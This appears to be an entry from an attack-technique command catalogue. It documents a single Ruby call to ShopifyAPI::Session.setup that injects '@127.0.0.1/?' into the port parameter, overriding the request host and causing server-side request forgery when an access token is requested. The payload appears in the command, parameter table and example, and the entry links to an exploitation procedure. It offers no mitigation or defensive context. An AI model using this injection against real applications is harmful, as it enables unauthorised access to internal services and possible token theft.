---
id: cmd-setup-malicious-port-001
data: 'ShopifyAPI::Session.setup protocol:''https'',secret:'''',port:''@127.0.0.1/?'''
tags:
  - exploitation
  - ssrf
type: command
output: Configuration applied
executor: ruby
platforms:
  - Ruby
created_at: '2023-10-01T00:00:00Z'
updated_at: '2025-12-14T17:32:28.635Z'
verified: false
validated: true
submitted: true
---
---

# setup-session-malicious-port

## Command

```ruby
ShopifyAPI::Session.setup protocol:'https',secret:'',port:'@127.0.0.1/?'
```

## Description

Sets up Session with malicious port injection to enable host override in URI parsing for SSRF.

## Parameters

| Parameter | Description | Required |
|-----------|-------------|----------|
| protocol | 'https' | Yes |
| secret | Empty string | Yes |
| port | Malicious injection '@127.0.0.1/?' | Yes |

## Examples

### Basic Usage

```ruby
ShopifyAPI::Session.setup protocol:'https',secret:'',port:'@127.0.0.1/?'
```

## Expected Output

Configuration applied, leading to SSRF on request_token.

## Related

- [[commands/request-access-token]]
- [[procedures/Exploit-Port-Parameter-for-SSRF]]

---
